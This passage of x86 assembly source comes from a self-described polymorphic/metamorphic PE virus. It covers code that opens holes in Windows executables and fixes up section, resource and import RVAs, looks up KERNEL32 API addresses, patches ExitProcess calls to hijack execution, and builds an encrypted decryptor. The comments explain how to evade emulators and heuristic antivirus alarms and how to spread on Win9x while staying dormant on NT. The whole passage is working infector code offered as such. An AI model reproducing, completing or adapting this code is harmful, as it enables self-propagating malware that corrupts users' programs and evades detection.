                cmp     [ebx], edi
                jb    @@NextDir_01
                add     [ebx], ecx
       @@NextDir_01:
                add     ebx, 8
                inc     eax
                dec     edx
                or      edx, edx
                jnz   @@LoopDir_01

      ;; Now we update the physical & virtual offsets of the sections

                mov     edx, [ebp+StartOfSectionHeaders]
                mov     ebx, [esi+14h]
                mov     eax, [ebp+MakingFirstHole]
                or      eax, eax
                jz    @@MakingDataHole_2
      @@MakingCodeHole_2:
                add     ebx, [esi+10h]  ; EBX = Physical offset of the hole
      @@MakingDataHole_2:
                mov     eax, [ebp+HeaderAddress]
                mov     eax, [eax+6]
                and     eax, 0FFFFh     ; Get the number of sections

                push    esi
                mov     esi, [ebp+MakingFirstHole]
      @@LoopUpdate_02:
                push    eax
                mov     eax, [edx+14h]  ; Check the section addresses. As we
                cmp     eax, ebx        ; did before, if we are making the
                jb    @@NextSection_00  ; hole at code we check the physical
                or      esi, esi        ; and virtual addresses and we update
                jnz   @@NextSection_00_ ; them if they are below. If we are
                cmp     eax, ebx        ; making the data hole (at the
                jz    @@NextSection_00  ; beginning of the data section) we
      @@NextSection_00_:                ; check if the address is below or
                add     eax, ecx        ; equal.
                mov     [edx+14h], eax
      @@NextSection_00:
                mov     eax, [edx+0Ch]
                cmp     eax, edi
                jb    @@NextSection_01
                or      esi, esi
                jnz   @@NextSection_01_
                cmp     eax, edi
                jz    @@NextSection_01
      @@NextSection_01_:
                add     eax, ecx
                mov     [edx+0Ch], eax
      @@NextSection_01:
                pop     eax             ; Next section.
                add     edx, 28h
                dec     eax
                or      eax, eax
                jnz   @@LoopUpdate_02
                pop     esi


     ;; Now we make the hole physically
                add     [esi+08h], ecx
                add     [esi+10h], ecx

                cmp     esi, [ebp+RelocHeader]
                jz    @@End

                push    ecx
                push    ebx          ; PUSH Physical_Address_Of_Hole
                mov     edx, [ebp+MappingAddress]
                add     edx, [ebp+FileSize]
                sub     edx, 4
                mov     edi, edx
                add     edi, ecx
                pop     ecx
                add     ecx, [ebp+MappingAddress]

      @@Again:  mov     eax, [edx]   ; Shift down all data
                mov     [edi], eax
                sub     edx, 4
                sub     edi, 4
                cmp     edx, ecx
                jae   @@Again

;;; Here we fill the hole with 0s

                pop     ecx
                and     ecx, 0FFFFFFFCh
                shr     ecx, 2
                add     edx, 4
                xor     eax, eax
      @@Again2: mov     [edx], eax
                add     edx, 4
                dec     ecx
                or      ecx, ecx
                jnz   @@Again2

     @@End:     pop     eax
                pop     edi
                mov     ecx, 0 ; Break the 3-POP sequence to avoid a
                pop     ecx     ; mis-identification with APICALL_END if the
                ret             ; registers are translated as EDX,ECX,EAX in
                                ; any generation.
UpdateHeaders   endp

;; This function gets the array of RVAs in EAX and updates them as always.
UpdateArrayOfRVAs proc
                or      eax, eax       ; If the array RVA is 0, then exit
                jz    @@UpdateArray_OK
                or      edx, edx       ; If the number of elements in the array
                jz    @@UpdateArray_OK ; is 0, then exit
                push    ebx
                mov     ebx, eax       ; Get the physical address
                call    TranslateVirtualToPhysical
                mov     eax, ebx
                pop     ebx
                or      eax, eax       ; If error, exit
                jz    @@UpdateArray_Updated01
        @@UpdateArrayLoop_01:
                cmp     [eax], edi          ; Now check every RVA and fix it
                jb    @@UpdateArray_Updated01 ; if it points after the hole
                add     [eax], ecx
        @@UpdateArray_Updated01:
                add     eax, 4
                dec     edx
                or      edx, edx
                jnz   @@UpdateArrayLoop_01
        @@UpdateArray_OK:
                ret
UpdateArrayOfRVAs endp


;; This function gets the RVA at EBX and looks the section where the RVA
;; points whithin. When we find it, then we add the physical address of the
;; section and the physical address of the mapping, returning the physical
;; address that corresponds to that virtual one.
;; 
;; EBX = Virtual address
TranslateVirtualToPhysical proc
                push    ecx
                or      ebx, ebx
                jz    @@Error
                mov     ecx, [ebp+HeaderAddress]
                mov     ecx, [ecx+6]
                and     ecx, 0FFFFh    ; Get the number of sections
                push    edx
                mov     edx, [ebp+StartOfSectionHeaders]
                push    eax
     @@LoopSection:
                mov     eax, [edx+0Ch] ; Virtual address of section
                cmp     ebx, eax       ; If it's below, it isn't here
                jb    @@NextSection
                add     eax, [edx+10h] ; Add the size of the section to the
                                       ; virtual address of it to get the end
                                       ; address of the section
                cmp     ebx, eax       ; If <EBX> is above, it isn't here
                jae   @@NextSection
                sub     ebx, [edx+0Ch] ; Get the offset inside the section
                add     ebx, [edx+14h] ; Add that offset to the physical addr.
                pop     eax            ; of the section.
                pop     edx
                add     ebx, [ebp+MappingAddress] ; Add the mapping address.
                pop     ecx
                ret                               ; Return with OK
     @@NextSection:
                add     edx, 28h      ; Check next section
                dec     ecx
                or      ecx, ecx
                jnz   @@LoopSection
                pop     eax
                pop     edx
     @@Error:   xor     ebx, ebx      ; If the RVA isn't inside any section,
                pop     ecx           ; return 0.
                ret
TranslateVirtualToPhysical endp

;; This function updates the RVAs of the resource tree.
UpdateResourceDir proc
   @@UpdateResourceDir2:
                push    eax
                mov     eax, [eax+4]     ; If 0, update the data (terminal
                and     eax, 80000000h   ;  node)
                or      eax, eax
                jz    @@UpdateData
                pop     eax
                push    eax
                mov     eax, [eax+4]     ; Get the branch address
                and     eax, 7FFFFFFFh
                add     eax, ebx
                push    edx
                push    eax
                mov     edx, [eax+0Ch]   ; Get the number of branches that
                and     edx, 0FFFFh      ; hold from this parent
                mov     eax, [eax+0Eh]
                and     eax, 0FFFFh
                add     edx, eax
                pop     eax
                add     eax, 10h         ; Update the branch recursively
                call  @@UpdateResourceDir2
                pop     edx
                jmp   @@NextDir          ; Check next branch
     @@UpdateData:
                pop     eax              ; Get the data address
                push    eax
                mov     eax, [eax+4]
                add     eax, ebx
                mov     eax, [eax]  ; Get the RVA to the element in EAX
                cmp     eax, edi    ; If it's above the hole address, fix it
                jb    @@UpdateOK
                pop     eax
                push    eax
                mov     eax, [eax+4]  ; Get the RVA to the element
                add     eax, ebx      ; Add it to the undo buffer
                push    ebx
                mov     ebx, eax
                call    AddUndoAction
                pop     ebx
                add     [eax], ecx    ; Fix the RVA
    @@UpdateOK:
     @@NextDir: pop     eax
                add     eax, 8        ; Get the next directory
                dec     edx           ; If there aren't more elements, return
                or      edx, edx      ; (recursive call, so go to next branch
                jnz   @@UpdateResourceDir2  ; or return completely)
                ret
UpdateResourceDir endp

;; This function adds an "undo" action to the undo buffer. If there is an
;; error in the process of updating the headers, when closing the file we
;; get this data and restore the old values.
AddUndoAction   proc
                push    edx
                mov     edx, [ebp+MakingFirstHole] ; Only make undo actions
                or      edx, edx            ; when making the first hole. If
                jz    @@Return              ; we make a second, we can't fail
                                            ; of doing it, since all checks
                                            ; where passed on the making of
                                            ; the first one.
                push    eax
                mov     edx, [ebp+NumberOfUndoActions] ; Get the counter
                add     edx, [ebp+OtherBuffers] ; Get the last element address
                mov     [edx], ebx              ; + 1 and store the offset of
                mov     eax, [ebx]              ; the value to undo and the
                mov     [edx+4], eax            ; data that address holds.
                add     edx, 8
                sub     edx, [ebp+OtherBuffers] ; Increase the number of undo
                mov     [ebp+NumberOfUndoActions], edx ; actions and exit.
                pop     eax
   @@Return:    pop     edx
                ret
AddUndoAction   endp

;; This function gets the undo buffer and restores the data we saved. We must
;; do this because there isn't a way of telling the Kernel32 to discard the
;; changes made to the mapping, so we have to make it manually. 
UndoChanges     proc
                mov     edx, [ebp+NumberOfUndoActions] ; Get the counter of
                or      edx, edx                   ; undo actions. If 0, exit.
                jz    @@Ret
                mov     ecx, edx
                sub     edx, 8
                add     edx, [ebp+OtherBuffers]
        @@Loop01:
                mov     ebx, [edx]   ; Get the address of the DWORD to restore
                mov     eax, [edx+4] ; Get the value to put for restoration
                mov     [ebx], eax   ; Restore it
                sub     edx, 8
                sub     ecx, 8       ; Next element
                or      ecx, ecx     ; If we haven't restored all, loop
                jnz   @@Loop01
        @@Ret:  ret
UndoChanges     endp

;; This function updates the import table, and returns the addresses of the
;; APIs the virus needs on execution.
;; Entries:
;; EDI = Virtual address of hole
;; ECX = Size of hole
;; If we use EDI = 0FFFFFFFFh as the address of the hole, nothing is updated
;; (it's logical, since all the RVAs are below this value), but the virtual
;; function addresses that we must use from the import table are retrieved.
;;
;; As an error control, we use the addresses of the functions that we expect
;; to be retrieved here. If any of these functions (ExitProcess, GetProcAddress
;; and GetModuleHandleA/W) are 0, then an error happened or any of them isn't
;; imported.
UpdateImports   proc
                push    esi
                mov     eax, [ebp+HeaderAddress] ; Get the import header addr.
                mov     ebx, [eax+80h]
                or      ebx, ebx
                jz    @@ImportsUpdated
                call    TranslateVirtualToPhysical ; Get the physical address.
                or      ebx, ebx                   ; If error, exit
                jz    @@ImportsUpdated
        @@UpdateImports_Loop00:
                mov     eax, [ebx+0Ch]  ; Get the RVA of the module name.
                or      eax, eax        ; If no name, error!
                jz    @@ImportsUpdated
                cmp     eax, edi           ; Fix it
                jb    @@UpdateImportsOK_01
                add     ebx, 0Ch
                call    AddUndoAction
                add     [ebx], ecx      ; [EBX+0Ch]
                sub     ebx, 0Ch


        @@UpdateImportsOK_01:
                push    ebx             ; Initialize this flag
                xor     ebx, ebx
                mov     [ebp+Kernel32Imports], ebx
                mov     ebx, eax
                call    TranslateVirtualToPhysical ; Get the physical address
                or      ebx, ebx                   ; of the module name
                jz    @@UpdateImports_Next00
                mov     eax, [ebx]                 ; Check if it's KERNEL32
                and     eax, 1F1F1F1Fh
                cmp     eax, 'nrek' AND 1F1F1F1Fh
                jnz   @@UpdateImports_Next00
                mov     eax, [ebx+4]
                and     eax, 0FFFF1F1Fh
                cmp     eax, '23le' AND 0FFFF1F1Fh
                jnz   @@UpdateImports_Next00
                mov     eax, 1                     ; If it is, set the flag
                mov     [ebp+Kernel32Imports], eax
        @@UpdateImports_Next00:
                pop     ebx


                mov     eax, [ebx]        ; Get the RVA to the function names
                or      eax, eax
                jz    @@UpdateImportsOK_04

                push    ebx               ; Get the physical address of the
                mov     ebx, eax          ; array
                call    TranslateVirtualToPhysical
                mov     eax, ebx
                pop     ebx
                or      eax, eax
                jz    @@UpdateImportsOK_04
        @@UpdateImports_Loop01:
                mov     edx, [eax]        ; Get an RVA from the array
                or      edx, edx
                jz    @@UpdateImportsOK_02
                cmp     edx, 80000000h             ; Ordinal?
                jae   @@UpdateImports_UpdatedOK    ; Then, don't update

                mov     esi, [ebp+Kernel32Imports] ; KERNEL32 module?
                or      esi, esi                   ; If not, don't check the
                jz    @@UpdateImports_NotKernel32  ; name
                push    ebx
                mov     ebx, edx
                call    TranslateVirtualToPhysical ; Get the physical address
                or      ebx, ebx                   ; of the function name
                jz    @@UpdateImports_UnknownFunction
                mov     esi, [ebx+2]
                cmp     esi, 'tixE'                ; Check for ExitProcess
                jz    @@UpdateImports_ExitProcess00
                cmp     esi, 'MteG'                ; Check for GetModuleHandle
                jz    @@UpdateImports_GetModuleHandle00
                cmp     esi, 'PteG'                ; Check for GetProcAddress
                jz    @@UpdateImports_GetProcAddress00
                cmp     esi, 'triV'                ; Check for VirtualAlloc
                jnz   @@UpdateImports_UnknownFunction
        @@UpdateImports_VirtualAlloc:
                mov     esi, [ebx+0Bh]
                cmp     esi, 'loc'
                jnz   @@UpdateImports_UnknownFunction
                xor     esi, esi                   ; VirtualAlloc ID
                jmp   @@UpdateImports_SaveFunctionAddress
        @@UpdateImports_GetProcAddress00:
                mov     esi, [ebx+6]
                cmp     esi, 'Acor'
                jnz   @@UpdateImports_UnknownFunction
                mov     esi, 1                     ; GetProcAddress ID
                jmp   @@UpdateImports_SaveFunctionAddress
        @@UpdateImports_ExitProcess00:
                mov     esi, [ebx+6]
                cmp     esi, 'corP'
                jnz   @@UpdateImports_UnknownFunction
                mov     esi, 2                     ; ExitProcess ID
                jmp   @@UpdateImports_SaveFunctionAddress
        @@UpdateImports_GetModuleHandle00:
                mov     esi, [ebx+0Ah]
                cmp     esi, 'naHe'
                jnz   @@UpdateImports_UnknownFunction
                mov     esi, [ebx+0Eh]
                cmp     esi, 'Aeld'               ; Check for GetModuleHandleA
                jz    @@UpdateImports_GetModuleHandleAFound
                cmp     esi, 'Weld'               ; Check for GetModuleHandleW
                jnz   @@UpdateImports_UnknownFunction
                mov     esi, 1
                jmp   @@UpdateImports_GetModuleHandleFound
        @@UpdateImports_GetModuleHandleAFound:
                xor     esi, esi
        @@UpdateImports_GetModuleHandleFound:
                mov     [ebp+GetModuleHandleMode], esi ; Set the mode: A or W
                mov     esi, 3                    ; GetModuleHandle ID
        @@UpdateImports_SaveFunctionAddress:
                pop     ebx
                ; EBX = Imports header
                ; EAX = Physical address of position in names array
                push    ebx
                push    eax
                push    ebx
                mov     ebx, [ebx]              ; Fix the RVA into the array
                call    TranslateVirtualToPhysical
                sub     eax, ebx  ; Position in array
                pop     ebx
                add     eax, [ebx+10h]
                cmp     eax, edi         ; If EDI == -1, this is not fixed
                jb    @@UpdateImports_SetFunctionAddress
                add     eax, ecx
        @@UpdateImports_SetFunctionAddress:
                or      esi, esi                    ; Set the function address
                jz    @@UpdateImports_SetVirtualAlloc
                cmp     esi, 1
                jz    @@UpdateImports_SetGetProcAddress
                cmp     esi, 2
                jz    @@UpdateImports_SetExitProcess
        @@UpdateImports_SetGetModuleHandle:
                mov     [ebp+GetModuleHandleAddress], eax
                jmp   @@UpdateImports_FunctionSet
        @@UpdateImports_SetVirtualAlloc:
                mov     [ebp+VirtualAllocAddress], eax
                jmp   @@UpdateImports_FunctionSet
        @@UpdateImports_SetGetProcAddress:
                mov     [ebp+GetProcAddressAddress], eax
                jmp   @@UpdateImports_FunctionSet
        @@UpdateImports_SetExitProcess:
                mov     [ebp+ExitProcessAddress], eax
        @@UpdateImports_FunctionSet:
                pop     eax
        @@UpdateImports_UnknownFunction:
        @@UpdateImports_Continue00:
                pop     ebx
        @@UpdateImports_NotKernel32:
                cmp     edx, edi
                jb    @@UpdateImports_UpdatedOK
                push    ebx
                mov     ebx, eax
                call    AddUndoAction         ; Add the undo action for this
                pop     ebx                   ; address
                add     [eax], ecx
        @@UpdateImports_UpdatedOK:
                add     eax, 4                ; Next array entry
                jmp   @@UpdateImports_Loop01

        @@UpdateImportsOK_02:
                mov     eax, [ebx]            ; Fix the array RVA itself
                cmp     eax, edi
                jb    @@UpdateImportsOK_03
                call    AddUndoAction
                add     [ebx], ecx
        @@UpdateImportsOK_03:
                add     ebx, 10h      ; Fix the RVA to the array of imported
                mov     eax, [ebx]    ; functions. It holds the imported
                cmp     eax, edi      ; addresses of the functions in run-time
                jb    @@UpdateImportsOK_04_  ; (but see below for a "cool"
                                             ; feature)
                call    AddUndoAction   ; Add the undo action for this.
                add     eax, ecx
                mov     [ebx], eax
                sub     eax, ecx
        @@UpdateImportsOK_04_:
                sub     ebx, 10h
        @@UpdateImportsOK_04:

;; Big-time duddy-dudde chili-chap Micro$oft paranoical "optimization"
;; What are that thunks at +10h in import header? Just guess!!
;; I was amazed why the infected programs worked under WinNT but NOT under
;;  win9x (just the opposite of what it happens normally). So, I supposed that
;;  the values at this thunk were always updated with the kernel exported
;;  addresses, so, just in case, it didn't matter if I updated also these
;;  addresses. FALSE!! (now imagine lots of red lights and alarms). By any
;;  dark reason, the win32 subsystem doesn't update that addresses if the
;;  executable runs under the operating system where it was compiled or
;;  was compiled for!! Windows NT updates this addresses ALWAYS, but not
;;  Win9x, which uses the hardcoded API addresses that are already at the
;;  executable (!!!!!!!!!!!!!!). So, if we don't touch this, all is fine.
;;
;; Idea: we can make EPO if we save this values and set our own ones. It will
;;  only work under Win9x, something that it's fine if we are making a ring-0
;;  virus.

;                 push    ebx
;                 mov     ebx, eax
;                 call    TranslateVirtualToPhysical
;                 or      ebx, ebx
;                 jz    @@NextRecord
;         @@LoopUpdateThunks:
;                 mov     eax, [ebx]
;                 or      eax, eax
;                 jz    @@NextRecord
;                 cmp     eax, edi
;                 jb    @@ThunkUpdated
;                 call    AddUndoAction
;                 add     eax, ecx
;                 mov     [ebx], eax
;         @@ThunkUpdated:
;                 add     ebx, 4
;                 jmp   @@LoopUpdateThunks
;         @@NextRecord:
;                 pop     ebx


                add     ebx, 14h    ; Get next import header
                jmp   @@UpdateImports_Loop00

        @@ImportsUpdated:
                pop     esi
                ret
UpdateImports   endp

;; Let's patch ExitProcess with several methods. The size of the patch must
;; be less than 6 bytes.
;; An alternate way has been added, which only works for Win9x: the Import
;; table is patched but not the call, so under Win9x, if the system coincides
;; with the version expressed in the header, the call will be made. This makes
;; a virus that is dormant under WinNT but spreads on Win9x.
;; ESI = Address to patch
;; EDX = Address to point to
PatchExitProcess proc
                push    eax
                mov     eax, 1
                call    RandomBoolean_X004_7   ; WEIGHT_X005
                or      eax, eax
                jz    @@PUSHRET
     @@IndirectDisplacement:         ; Let's make "JMP/PUSH [Address]"
                push    ecx
                mov     eax, [ebp+TextHeader]  ; Get the code section address
                mov     ecx, [eax+10h]         ; Get the size in ECX
                mov     eax, [eax+14h]
                add     eax, [ebp+MappingAddress]
                push    edx
                sub     ecx, 4
       @@LoopFindHole:
                sub     ecx, 1
                or      ecx, ecx
                jz    @@NotFound         ; Search for a hole of the type
                mov     edx, [eax]       ; "INT 3 padded" of at least DWORD
                cmp     edx, 0CCCCCCCCh  ; sized
                jz    @@HoleFound
                add     eax, 1
                jmp   @@LoopFindHole
     @@NotFound:
                pop     edx             ; If we didn't find anything, make the
                pop     ecx             ; other method
                jmp   @@PUSHRET
     @@HoleFound:
                pop     edx           ; Put the address to jump at the hole,
                mov     [eax], edx    ; overwriting the padding.
                mov     ecx, [esi+4]
                and     ecx, 0FFh     ; Now look the way ExitProcess is made.
                cmp     ecx, 0C3h     ; Is there a RET after it? (the compilers
                                      ; put them)
                jz    @@RetInserted   ; If it is, put "PUSH DWORD PTR [ExitP]"
                sub     eax, [ebp+MappingAddress]
                mov     ecx, [ebp+TextHeader]
                sub     eax, [ecx+14h]       ; Get the address of the hole
                add     eax, [ecx+0Ch]
                mov     ecx, [ebp+HeaderAddress]
                add     eax, [ecx+34h]

                mov     [esi], eax           ; Overwrite the call with the
                mov     eax, 25h             ; hole address, and set "JMP"
                mov     [esi-1], al          ; instruction.
                pop     ecx
                jmp   @@Return
     @@RetInserted:
                mov     eax, 35h        ; Set "PUSH DWORD PTR [ExitProcess]"
                mov     [esi-1], al     ; and use the RET before to jump.
                pop     ecx
                jmp   @@Return
     @@PUSHRET:                       ; Make "PUSH Address/RET"
                mov     eax, 68h
                mov     [esi-2], eax
                mov     [esi-1], edx
                mov     eax, 0C3h
                mov     [esi+3], al

     @@Return:  pop     eax
                ret
PatchExitProcess endp
;;
;;
;; End of the infector
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;; KEYWORD: Key_!MakePoly
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; ********************************************************************** ;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; The polymorphic engine
;; ----------------------
;;
;; This is not a polymorphic engine like I made in other viruses, since I
;; don't code by myself any machine code: I let the metamorphic engine to
;; do it, calling XpandCode and AssembleCode to build the instructions. So,
;; the decryptor is always constructed in my pseudoassembler.
;;
;; The decryptor is sometimes only a "mover": since the virus can be not
;; encrypted once in every 16 times, in fact only copies the data to the
;; reserved memory. This avoids lots of heuristic alarms.
;;
;; "Branching", as I did in TUAREG, is not made, but PRIDE is. The decryption
;; will be non-linear, with a control of buffer-overflow that allows me to
;; have a not-aligned buffer size, but still making random index accessing.
;;
;; The decryptor will allocate virtual memory at the beginning to copy the
;; virus there, calling to the imported function. If the function is not
;; imported by the host, some code will be added to import it and call it.
;; After that, We'll push the parameters needed for the virus working and we
;; will copy the virus to the allocated memory, decrypting it on the fly and
;; accessing that data with apparentlu random offsets.
;;
;; It has also the chance of making a little anti-emulator trick at the
;; beginning: once in every 4 decryptors, a RDTSC/RET like instruction will
;; be constructed on runtime, called, and a random bit from EAX checked for
;; 0 or 1, ending execution if the condition is met. This makes the virus to
;; execute randomly, and forcing a detection by signature or heuristics.
;;

MakeDecryptor   proc
; We need:
; The instruction table stored at [InstructionTable]
; A buffer to assemble the decryptor at [NewAssembledCode]
; The number of jump labels at [NumberOfLabels]
; A table of labels at [LabelTable], with the instruction address at +4
; The address of the last instruction at [AddressOfLastInstruction]

                mov     [ebp+InstructionTable], edi  ; Set the pointer
                xor     eax, eax
                mov     [ebp+NumberOfLabels], eax    ; Initialize these vars.
                mov     [ebp+NumberOfVariables], eax
                mov     eax, edi
                add     eax, 80000h
                mov     [ebp+ExpansionResult], eax

                mov     eax, [ebp+RVA_DataHole]   ; Get the virtual address
                mov     ecx, [ebp+HeaderAddress]  ; of the data hole.
                add     eax, [ecx+34h]
                mov     [ebp+StartOfEncryptedData], eax

                mov     edx, [ebp+RelocHeader]    ; Check if we have a .reloc
                or      edx, edx                  ; header.
                jnz   @@SetDataAtEndOfCryptedCode

                mov     ecx, [ebp+DataHeader]     ; If we haven't a .reloc,
                mov     edx, [ebp+HeaderAddress]  ; we put the data buffer
                call    Random                    ; address at the .data
                and     eax, 0FCh                 ; section with a random
                add     eax, [ecx+0Ch]            ; displacement start offset
                add     eax, [edx+34h]            ; to avoid fixed addresses.
                jmp   @@SetDecryptorDataSection   ; Since all in the app has
                               ; finished (we arrived here with an ExitProcess
                               ; patch) we can overwrite .data as we want.

      @@SetDataAtEndOfCryptedCode:
                add     eax, [ebp+SizeOfNewCode]  ; Get the size of the new
                and     eax, 0FFFFFFFCh           ; assembled code and set the
                add     eax, 4                    ; decryptor's data frame at
      @@SetDecryptorDataSection:                  ; the end of the encrypted
                mov     [ebp+Decryptor_DATA_SECTION], eax  ; part.

                mov     eax, 1                         ; Set this flag for the
                mov     [ebp+CreatingADecryptor], eax  ; expander.

                call    Poly_MakeRandomExecution  ; Create a random-execution
                                                  ; snippet to fuck emulators
                                                  ; a little ;)

                mov     eax, [ebp+VirtualAllocAddress]
                or      eax, eax           ; Does the app import VirtualAlloc?
                jnz   @@VirtualAllocAlreadyImported ; If it does, jump and
                                                    ; continue

   ;; Here we are going to create a code that imports VirtualAlloc using the
   ;; functions GetModuleHandleA/W and GetProcAddress.
                mov     eax, [ebp+GetModuleHandleMode]
                or      eax, eax                   ; Check if GetModuleHandle
                jnz   @@GetModuleHandleUNICODE     ; is ASCII or UNICODE

     @@GetModuleHandleASCII:
                call    Random
                and     eax, 20202020h           ; Set 'KERN' with random
                add     eax, 'NREK'              ; up/downcase
                mov     [ebp+Poly_FirstPartOfFunction], eax
                call    Random
                and     eax, 00002020h
                add     eax, '23LE'              ; Set 'EL32' with random
                mov     [ebp+Poly_SecondPartOfFunction], eax ; up/downcase
                mov     eax, 2
                call    RandomBoolean_X004_7   ; WEIGHT_X006
                or      eax, eax
                jz    @@DontSetExtension0        ; Select randomly if we put
                call    Random                   ; the extension or not. If
                and     eax, 20202000h           ; we don't, GetModuleHandle
                add     eax, 'LLD.'              ; puts ".DLL" for us
        @@DontSetExtension0:
                mov     [ebp+Poly_ThirdPartOfFunction], eax
                xor     eax, eax
                mov     [ebp+AdditionToBuffer], eax ; Set it at the first part
                                                    ; of the data buffer
                call    Poly_SetFunctionName     ; Make the "make name" code
                jmp   @@NameOfModuleInitialized  ; Jump to call GetMod.H.()

     @@GetModuleHandleUNICODE:                   ; UNICODE
                call    Random
                and     eax, 00200020h           ; Set 'KE' (random upcase)
                add     eax, 0045004Bh ; 'EK'
                mov     [ebp+Poly_FirstPartOfFunction], eax
                call    Random
                and     eax, 00200020h
                add     eax, 004E0052h ; 'NR'    ; Set 'RN'
                mov     [ebp+Poly_SecondPartOfFunction], eax
                call    Random
                and     eax, 00200020h
                add     eax, 004C0045h ; 'LE'    ; Set 'EL'
                mov     [ebp+Poly_ThirdPartOfFunction], eax
                xor     eax, eax
                mov     [ebp+AdditionToBuffer], eax
                call    Poly_SetFunctionName     ; Make the name

                mov     eax, 00320033h ; '23'    ; Set '32'
                mov     [ebp+Poly_FirstPartOfFunction], eax
                mov     eax, 2
                call    RandomBoolean_X004_7     ; WEIGHT_X006
                or      eax, eax
                jz    @@DontSetExtension1        ; Set (or not) the extension
                call    Random                   ; ".DLL"
                and     eax, 00200000h
                add     eax, 0044002Eh ; 'D.'
          @@DontSetExtension1:
                mov     [ebp+Poly_SecondPartOfFunction], eax
                or      eax, eax
                jz    @@DontSetExtension2
                call    Random
                and     eax, 00200020h
                add     eax, 004C004Ch ; 'LL'
          @@DontSetExtension2:
                mov     [ebp+Poly_ThirdPartOfFunction], eax
                mov     eax, 0Ch
                mov     [ebp+AdditionToBuffer], eax
                call    Poly_SetFunctionName    ; Make that part of the name

   @@NameOfModuleInitialized:
                call    Poly_SelectThreeRegisters          ; Make a "Call
                mov     edx, [ebp+Decryptor_DATA_SECTION]  ; GetModuleHandle"
                mov     ecx, [ebp+BufferRegister]
                call    Poly_DoMOVRegValue

                mov     ecx, [ebp+BufferRegister]
                call    Poly_DoPUSHReg                ; Push the module name

                mov     ecx, [ebp+GetModuleHandleAddress]
                call    Poly_DoCALLMem                ; Call the function

                mov     eax, 0F6h    ; Make an APICALL_STORE [Data+10h]
                mov     [edi], eax
                mov     eax, 0808h
                mov     [edi+1], eax
                mov     eax, [ebp+Decryptor_DATA_SECTION]
                add     eax, 10h
                mov     [edi+3], eax
                add     edi, 10h

                mov     eax, 'triV'     ; Now make the name of the function to
                mov     [ebp+Poly_FirstPartOfFunction], eax ; get the address,
                mov     eax, 'Alau'                         ; in this case
                mov     [ebp+Poly_SecondPartOfFunction], eax ; VirtualAlloc()
                mov     eax, 'coll'
                mov     [ebp+Poly_ThirdPartOfFunction], eax
                xor     eax, eax
                mov     [ebp+AdditionToBuffer], eax
                call    Poly_SetFunctionName       ; Set the function name

                call    Poly_SelectThreeRegisters
                mov     edx, [ebp+Decryptor_DATA_SECTION]
                mov     ecx, [ebp+BufferRegister]
                call    Poly_DoMOVRegValue
                mov     ecx, [ebp+BufferRegister]  ; Make the PUSH of the
                call    Poly_DoPUSHReg             ; offset to the name

                call    Poly_SelectThreeRegisters  ; Make the PUSH of the
                mov     ecx, [ebp+IndexRegister]   ; module handle
                mov     ebx, 10h
                call    Poly_DoMOVRegMem
                mov     ecx, [ebp+IndexRegister]
                call    Poly_DoPUSHReg

                mov     ecx, [ebp+GetProcAddressAddress]
                call    Poly_DoCALLMem        ; Call to GetProcAddress()

                mov     eax, 0F6h        ; Insert an APICALL_STORE [Data]
                mov     [edi], eax
                mov     eax, 0808h
                mov     [edi+1], eax
                mov     eax, [ebp+Decryptor_DATA_SECTION]
                add     eax, 10h
                mov     [edi+3], eax
                add     edi, 10h
                                         ; Set the function address. We don't
                mov     [ebp+VirtualAllocAddress], eax ; check if it's OK
                                                       ; because we know it's
                                                       ; OK.
   @@VirtualAllocAlreadyImported:
                mov     eax, 8                    ; Initialize the registers
                mov     [ebp+BufferRegister], eax ; used by the decryptor
                mov     [ebp+CounterRegister], eax
                mov     [ebp+IndexRegister], eax

                mov     edx, 4                ; Push the values for allocating
                call    Poly_DoPUSHValue      ; memory: PAGE_READWRITE and
                mov     edx, 1000h            ; MEM_COMMIT
                call    Poly_DoPUSHValue
                call    Random
                and     eax, 01F000h          ; Allocate 3407872 bytes plus
                mov     edx, 340000h          ; a random up to 128 Kb.
                add     edx, eax
                call    Poly_DoPUSHValue      ; Push the value
                xor     edx, edx              ; Push 0 (reserve where the
                call    Poly_DoPUSHValue      ; system wants)

                mov     ecx, [ebp+VirtualAllocAddress]
                call    Poly_DoCALLMem        ; Call to VirtualAlloc

                mov     eax, 0F6h             ; APICALL_STORE [Data]
                mov     [edi], eax
                mov     eax, 0808h
                mov     [edi+1], eax
                mov     eax, [ebp+Decryptor_DATA_SECTION]
                mov     [edi+3], eax
                add     edi, 10h
                                              ; Get three new registers
                call    Poly_SelectThreeRegisters

                mov     ecx, [ebp+IndexRegister]
                xor     ebx, ebx              ; Get the returned value in a
                call    Poly_DoMOVRegMem      ; register

                mov     ecx, [ebp+IndexRegister]
                call    Poly_MakeCheckWith0   ; Make a check with NULL to know
                                              ;  if the function worked
                mov     eax, 74h              ; JZ -> if VirtualAlloc returned
                mov     [edi], eax            ;  NULL, jump to ExitProcess
                mov     [ebp+Poly_Jump_ErrorInVirtualAlloc], edi ; Save the
                add     edi, 10h               ; offset for later completion

                mov     ecx, [ebp+IndexRegister]
                mov     edx, [ebp+New_CODE_SECTION]
                call    Poly_DoADDRegValue    ; Add the offset of CODE_SECTION

                mov     ecx, [ebp+IndexRegister]
                mov     ebx, 10h              ; Save it at +10h in decryptor's
                call    Poly_DoMOVMemReg      ; data frame

       ; Now we push parameters for the virus. We pass all the new section
       ; addresses, the flag of GetModuleHandle usage (ASCII or UNICODE) and
       ; the Delta Register the virus is using. We also push the addresses of
       ; the functions GetModuleHandle and GetProcAddress, so the virus hasn't
       ; to scan the KERNEL32 to get the values of the functions, breaking
       ; another heuristic alarm. The values of the passed functions have the
       ; upper bits of the sections with a random value, since in the
       ; entrypoint our code will anulate that bits (this is only to make the
       ; passing of values more random).
                call    Random
                and     eax, 0FC000000h
                mov     edx, [ebp+New_DISASM2_SECTION]
                add     edx, eax
                call    Poly_DoPUSHValue   ; Push DISASM2_SECTION address

                call    Random
                and     eax, 0FC000000h
                mov     edx, [ebp+New_DATA_SECTION]
                add     edx, eax
                call    Poly_DoPUSHValue   ; Push the DATA_SECTION address

                call    Random
                and     eax, 0FC000000h
                mov     edx, [ebp+New_BUFFERS_SECTION]
                add     edx, eax
                call    Poly_DoPUSHValue   ; Push the BUFFERS_SECTION address

                call    Random
                and     eax, 0FC000000h
